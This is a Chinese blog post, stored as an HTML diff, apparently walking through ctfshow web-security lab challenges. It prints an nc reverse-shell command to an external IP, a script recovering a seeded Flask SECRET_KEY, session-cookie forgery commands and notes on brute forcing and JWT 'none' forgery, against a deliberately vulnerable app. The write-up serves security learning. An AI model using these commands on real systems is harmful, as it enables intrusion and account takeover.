@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一章第二章反弹shell构造使用nc反弹shell：nc -e &#x2F;bin&#x2F;sh 20.18.226.90 4444然后在本地监听4444端口：nc -lvp 4444 第三章Flask_Session伪造进去之后read路由有文件包含，尝试读取了源码&#x2F;app&#x2F;app.py. 123456789101112131415161718192021222324252627282930">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow___Web应用安全与防护">
+<meta property="og:url" content="http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/index.html">
+<meta property="og:site_name" content="y@7q">
+<meta property="og:description" content="第一章第二章反弹shell构造使用nc反弹shell：nc -e &#x2F;bin&#x2F;sh 20.18.226.90 4444然后在本地监听4444端口：nc -lvp 4444 第三章Flask_Session伪造进去之后read路由有文件包含，尝试读取了源码&#x2F;app&#x2F;app.py. 123456789101112131415161718192021222324252627282930">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250903002926.png">
+<meta property="article:published_time" content="2025-09-02T16:18:36.000Z">
+<meta property="article:modified_time" content="2025-09-03T01:13:37.669Z">
+<meta property="article:author" content="y@7q">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250903002926.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ctfshow___Web应用安全与防护</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/CScourse/Lab2%E4%BD%9C%E4%B8%9A%E8%AE%B0%E5%BD%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/CScourse/CS61B%204.%20References,%20Recursion,%20and%20Lists/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&text=ctfshow___Web应用安全与防护"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&is_video=false&description=ctfshow___Web应用安全与防护"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow___Web应用安全与防护&body=Check out this article: http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&name=ctfshow___Web应用安全与防护&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&t=ctfshow___Web应用安全与防护"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0"><span class="toc-number">1.</span> <span class="toc-text">第一章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0"><span class="toc-number">2.</span> <span class="toc-text">第二章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.</span> <span class="toc-text">反弹shell构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">第三章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-Session%E4%BC%AA%E9%80%A0"><span class="toc-number">3.1.</span> <span class="toc-text">Flask_Session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">弱口令爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">JWT令牌伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">第四章</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ctfshow___Web应用安全与防护
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">y@7q</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-02T16:18:36.000Z" class="dt-published" itemprop="datePublished">2025-09-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="反弹shell构造"><a href="#反弹shell构造" class="headerlink" title="反弹shell构造"></a>反弹shell构造</h3><p>使用nc反弹shell：<br><code>nc -e /bin/sh 20.18.226.90 4444</code><br>然后在本地监听4444端口：<br><code>nc -lvp 4444</code></p>
+<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="Flask-Session伪造"><a href="#Flask-Session伪造" class="headerlink" title="Flask_Session伪造"></a>Flask_Session伪造</h3><p>进去之后read路由有文件包含，尝试读取了源码&#x2F;app&#x2F;app.py.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib.request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line"><span class="built_in">print</span>(app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>])</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;CTFshow 网页爬虫系统 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;读取网页&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;禁止访问&#x27;</span></span><br><span class="line">        res = urllib.request.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;无读取内容可以展示&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;访问受限&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">False</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>发现SECRET_KEY有用到random库，应该是伪随机固定数值。<br><code>uuid.getnode()</code>用于获取当前机器的MAC地址，作为随机数种子的一部分。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uuid</span>.getnode()</span><br><span class="line"></span><br><span class="line">获取硬件的地址并以<span class="number">48</span>位二进制长度的正整数形式返回，这里所说的硬件地址是指网络接口的MAC</span><br><span class="line">地址，如果一个机器有多个网络接口，可能返回其中的任一个。如果获取失败，将按照RFC <span class="number">4122</span>的规定</span><br><span class="line">将随机返回的<span class="number">48</span>位二进制整数的第<span class="number">8</span>位设置成<span class="number">1</span>。</span><br></pre></td></tr></table></figure>
+<p>读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 获得mac地址，然后脚本处理一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;c6:bc:6b:39:0a:98&quot;</span></span><br><span class="line">temp = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">temp = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">&#x27;&#x27;</span>.join(temp)</span><br><span class="line">mac = <span class="built_in">int</span>(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(randStr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>之后用得到的私钥伪造session：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">E:\<span class="title">myCTFTools</span>\<span class="title">WebTools</span>\<span class="title">flask</span>-<span class="title">session</span>-<span class="title">cookie</span>-<span class="title">manager</span>-<span class="title">master</span>&gt;<span class="title">python</span> <span class="title">flask_session_cookie_manager3.py</span> <span class="title">decode</span> -<span class="title">c</span> <span class="title">eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLcPtA.hTVLWpwcdv41tb8x22PNx89NEE4</span></span></span><br><span class="line"><span class="function"><span class="title">b</span>&#x27;&#123;&quot;<span class="title">username</span>&quot;:&quot;<span class="title">guest</span>&quot;&#125;&#x27;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">E</span>:\<span class="title">myCTFTools</span>\<span class="title">WebTools</span>\<span class="title">flask</span>-<span class="title">session</span>-<span class="title">cookie</span>-<span class="title">manager</span>-<span class="title">master</span>&gt;<span class="title">python</span> <span class="title">flask_session_cookie_manager3.py</span> <span class="title">encode</span> -<span class="title">t</span> &quot;&#123;&#x27;<span class="title">username</span>&#x27;:&#x27;<span class="title">admin</span>&#x27;&#125;&quot; -<span class="title">s</span> &quot;7.028160380236292&quot;</span></span><br><span class="line"><span class="function"><span class="title">eyJ1c2VybmFtZSI6ImFkbWluIn0.aLcYIg.unDeF5MceMaqC8PwOr9qsWEG0Es</span></span></span><br></pre></td></tr></table></figure>
+
+<p>最后访问<code>/flag</code>路由，成功获取flag。<br><img src="https://raw.githubusercontent.com/yatq21/Pictures/main/images/20250903002926.png" alt="20250903002926"></p>
+<h2 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h2><p>用提供的字典爆破就行。</p>
+<h2 id="JWT令牌伪造"><a href="#JWT令牌伪造" class="headerlink" title="JWT令牌伪造"></a>JWT令牌伪造</h2><p>根据提示，考的是none空加密算法。<br>直接在线修改为none，然后admin修改为true即可。</p>
+<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0"><span class="toc-number">1.</span> <span class="toc-text">第一章</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0"><span class="toc-number">2.</span> <span class="toc-text">第二章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E6%9E%84%E9%80%A0"><span class="toc-number">2.1.</span> <span class="toc-text">反弹shell构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">第三章</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-Session%E4%BC%AA%E9%80%A0"><span class="toc-number">3.1.</span> <span class="toc-text">Flask_Session伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">4.</span> <span class="toc-text">弱口令爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text">JWT令牌伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0"><span class="toc-number">6.</span> <span class="toc-text">第四章</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&text=ctfshow___Web应用安全与防护"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&is_video=false&description=ctfshow___Web应用安全与防护"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ctfshow___Web应用安全与防护&body=Check out this article: http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&title=ctfshow___Web应用安全与防护"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&name=ctfshow___Web应用安全与防护&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yatq.xyz/%E9%9D%B6%E5%9C%BA/ctfshow-Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E4%B8%8E%E9%98%B2%E6%8A%A4/&t=ctfshow___Web应用安全与防护"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    y@7q
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
